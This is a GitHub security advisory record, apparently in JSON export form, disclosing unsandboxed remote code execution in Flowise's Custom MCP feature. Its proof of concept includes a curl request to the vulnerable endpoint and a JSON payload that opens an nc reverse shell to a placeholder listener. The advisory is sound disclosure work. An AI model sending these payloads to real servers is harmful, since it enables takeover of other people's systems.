{
  "Severity": "HIGH",
  "UpdatedAt": "2025-09-15T20:30:34Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "flowise"
  },
  "Advisory": {
    "DatabaseId": 311845,
    "Id": "GSA_kwCzR0hTQS02OTMzLWpweDUtcTg3cc4ABMIl",
    "GhsaId": "GHSA-6933-jpx5-q87q",
    "References": [
      {
        "Url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6933-jpx5-q87q"
      },
      {
        "Url": "https://github.com/FlowiseAI/Flowise/pull/5201"
      },
      {
        "Url": "https://github.com/FlowiseAI/Flowise/commit/ac7cf30e019cde54905bf09b5d3fe1c6ba42f9b9"
      },
      {
        "Url": "https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.0.6"
      },
      {
        "Url": "https://github.com/advisories/GHSA-6933-jpx5-q87q"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-6933-jpx5-q87q"
      }
    ],
    "Description": "### Summary\nThe Custom MCPs feature is designed to execute OS commands, for instance, using tools like `npx` to spin up local MCP Servers. However, Flowise's inherent authentication and authorization model is minimal and lacks role-based access controls (RBAC). Furthermore, the default installation of Flowise operates without authentication unless explicitly configured using the `FLOWISE_USERNAME` and `FLOWISE_PASSWORD` environment variables.\n\nThis combination presents a significant security risk, potentially allowing users on the platform to execute unsandboxed system commands. This can result in Remote Code Execution (RCE) and complete compromise of the running platform container or server.\n\n### PoC\n1. Follow the provided instructions for running the app using Docker Compose (or other methods of your choosing such as `npx`, `pnpm`, etc):\n   https://github.com/FlowiseAI/Flowise?tab=readme-ov-file#-docker\n\n2. Create a new file named `payload.json` somewhere in your machine, with the following data:\n```\n{\"inputs\":{\"mcpServerConfig\":{\"command\": \"touch\",\"args\": [\"/tmp/yofitofi\"]}},\"loadMethod\":\"listActions\"}\n```\n\n3. Send the following `curl` request using the `payload.json` file created above with the following command:\n```\ncurl -XPOST -H \"x-request-from: internal\" -H \"Content-Type: application/json\" --data @payload.json \"http://localhost:3000/api/v1/node-load-method/customMCP\"\n```\n\n4. Observe that a new file named `yofitofi` is created under `/tmp` folder.\n\nSimilarily, we can use the same technique to gain a reverse shell using the built-in `nc` utility with the following JSON payload:\n```\n{\"inputs\":{\"mcpServerConfig\":{\"command\": \"nc\",\"args\": [\n\"\u003cLISTENER_IP_ADDRESS\u003e\",\"\u003cLISTENER_PORT\u003e\",\"-e\",\"/bin/sh\"\n]}},\n\"loadMethod\":\"listActions\"}\n```\n\n![Pasted image 20250420132335](https://github.com/user-attachments/assets/b41093b9-a0d7-415e-bf9b-b8cbce7183d6)\n\n### Impact\nRemote code execution\n\n### Mitigation\n- Consider adding additional access controls surronding sensitive functionality such as Custom MCP, e.g. only users with \"Admin\" roles will be able to configure new Custom MCPs within the platform.\n- Consider disabling the Custom MCP feature by default, with a clear disclaimer for end users on the implications of enabling this feature.\n- Consider running Custom MCPs within a sandboxed environment\n\n### Credit\nThe vulnerability was discovered by Assaf Levkovich of the JFrog Security Research team.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-09-15T20:30:30Z",
    "Severity": "HIGH",
    "Summary": "Flowise has unsandboxed remote code execution via Custom MCP",
    "UpdatedAt": "2025-09-15T20:30:34Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "3.0.6"
      },
      "VulnerableVersionRange": "\u003e= 2.2.7-patch.1, \u003c 3.0.6"
    }
  ]
}